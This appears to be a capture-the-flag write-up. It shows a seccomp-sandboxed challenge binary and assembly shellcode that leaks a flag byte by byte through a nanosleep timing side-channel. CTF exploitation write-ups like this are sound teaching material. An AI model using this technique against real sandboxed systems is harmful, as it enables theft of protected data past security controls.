#metadata(
  (
    title: "Timing side-channel via nanosleep",
    description: "Using the nanosleep syscall to create a timing side-channel for leaking data when traditional output channels are blocked.",
    date: "2025-12-30",
    order: 11,
    draft: false,
  ),
)<frontmatter>
#import "../../../../typst-theme.c.typ": project
#show: project


== Challenge Source Code

```c
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <seccomp.h>

int main(int argc, char **argv, char **envp)
{
    assert(argc > 1);

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);

    int shellcode_size = read(0, shellcode, 0x1000);

    scmp_filter_ctx ctx;

    ctx = seccomp_init(SCMP_ACT_KILL);
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(nanosleep), 0) == 0);

    assert(seccomp_load(ctx) == 0);

    ((void(*)())shellcode)();
}
```

= Timing side-channel via nanosleep

== Introduction

This challenge presents a extremely restrictive sandbox. Only `read` and `nanosleep` syscalls are permitted. All other syscalls, including `write` and `exit`, are blocked by seccomp with `SCMP_ACT_KILL`.

== Vulnerability Analysis

The program opens a file (the flag) before entering the sandbox, providing us with an open file descriptor (FD 3). While we can read the flag into memory, we cannot output it directly.

However, since `nanosleep` is allowed, we can use it to modulate the process's execution time based on the data we've read, creating a timing side-channel.

== Exploitation Steps

=== 1. Reading the Flag
We read the flag into a known memory address.

```nasm
/* read(3, buf, 100) */
mov rdi, 3
mov rsi, buf_addr
mov rdx, 100
mov rax, 0
syscall
```

=== 2. Timing Side-Channel
We compare a byte from the flag with a guess. If they match, we call `nanosleep` for a noticeable duration (e.g., 1 second). If they don't match, we call a forbidden syscall (like `exit`), which triggers seccomp to kill the process immediately.

```nasm
/* Compare byte at [index] with [guess] */
movzx rax, byte ptr [buf_addr + index]
cmp rax, guess
jne exit_fast

/* nanosleep({1, 0}, NULL) */
mov qword ptr [time_struct], 1
mov qword ptr [time_struct + 8], 0
mov rdi, time_struct
xor rsi, rsi
mov rax, 35
syscall

exit_fast:
mov rax, 60 /* SYS_exit (forbidden) */
syscall
```

=== 3. Automated Reconstruction
A python script iterates through character positions and possible values. It measures the time elapsed from the start of shellcode execution until the process terminates. A duration significantly longer than the process overhead (e.g., > 0.8s) indicates a correct guess.

The retrieved flag was: `falg\n`.

```
